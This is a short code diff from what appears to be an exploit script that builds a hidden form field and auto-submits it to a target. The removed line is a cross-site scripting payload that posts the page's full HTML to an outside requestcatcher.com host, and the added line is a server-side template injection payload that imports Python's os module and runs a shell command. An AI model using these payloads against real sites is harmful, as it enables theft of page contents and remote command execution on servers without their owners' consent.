@@ -14,7 +14,7 @@
       const i = document.createElement('input');
       i.type = 'hidden';
       i.name = 'comment';
-      i.value = `<script>fetch("https://singetu0096.requestcatcher.com/",{method:"POST",mode:"no-cors",body:document.documentElement.outerHTML})<\/script>`;
+      i.value = `{{request.application.__globals__.__builtins__.__import__('os').popen('ls').read()}}`;
       f.appendChild(i);
       document.body.appendChild(f);
       f.submit();
